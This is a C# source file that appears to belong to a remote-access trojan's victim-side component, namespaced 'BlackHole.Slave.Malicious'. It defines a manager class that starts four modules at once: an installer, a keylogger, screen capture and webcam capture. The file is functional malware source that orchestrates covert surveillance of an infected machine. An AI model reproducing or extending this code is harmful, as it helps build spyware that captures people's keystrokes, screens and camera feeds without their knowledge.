using System.Collections.Generic;
using BlackHole.Common;

namespace BlackHole.Slave.Malicious
{
    /// <summary>
    /// 
    /// </summary>
    public sealed class MaliciousManager : Singleton<MaliciousManager>
    {
        /// <summary>
        /// 
        /// </summary>
        private readonly List<IMalicious> m_malicious;

        /// <summary>
        /// 
        /// </summary>
        public MaliciousManager()
        {
            m_malicious = new List<IMalicious>
            {
                Installer.Instance,
                Keylogger.Instance,
                ScreenCapture.Instance,
                Webcam.Instance
            };
        }

        /// <summary>
        /// 
        /// </summary>
        public void Initialize()
        {
            m_malicious.ForEach(malicious => malicious.Initialize());
        }
    }
}
